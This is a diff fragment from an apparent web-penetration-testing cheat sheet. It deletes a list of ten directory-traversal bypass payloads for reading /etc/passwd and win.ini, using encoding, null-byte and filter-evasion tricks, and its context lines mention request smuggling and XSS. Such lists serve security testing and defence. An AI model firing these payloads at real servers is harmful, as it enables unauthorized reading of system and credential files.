@@ -6367,19 +6367,6 @@ GET http://127.0.0.1:8080/admin
 5.7 Smuggling → Stored XSS Through Cache Poisoning
 Inject malicious JavaScript into cacheable responses.
 ```
----
-## 🛠️ Directory Traversal Bypass Techniques
-
-1. **Basic Traversal** |    - Use when no filtering is applied.   - Payload: `../../../../etc/passwd`
-2. **Absolute Path Bypass** |    - Works when the app prepends a default directory and allows absolute paths.    - Payload: `/etc/passwd`
-3. **Non-Recursive Filter Bypass** |   - Bypasses filters that strip `../` only once.     - Payload: `....//....//etc/passwd`
-4. **Double URL Encoding** |    - Bypasses filters that decode input before checking.     - Payload: `%252e%252e%252f%252e%252e%252fetc%252fpasswd`
-5. **Unicode Encoding** |    - Uses Unicode representations of `.` and `/`.     - Payload: `%u002e%u002e%u2215%u002e%u002e%u2215etc%u2215passwd`
-6. **Overlong UTF-8 Encoding** |    - Exploits invalid UTF-8 sequences accepted by some decoders.     - Payload: `%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd`
-7. **Null Byte Injection** |    - Bypasses file extension validation by truncating `.jpg`.     - Payload: `../../../etc/passwd%00.jpg`
-8. **Path Prefix Validation Bypass** |    - Satisfies prefix check while still traversing directories.    - Payload: `/images/../../../etc/passwd`
-9. **Mangled Path** |    - Confuses filters by duplicating traversal sequences.     - Payload: `/.../.../.../.../.../.../.../.../.../etc/passwd`
-10. **Backslash Variant (Windows)** |     - Useful on Windows-based servers.     - Payload: `..\\..\\..\\windows\\win.ini`
 
 # ✅ **HTTP Verb Testcase Names (Names Only)**
 
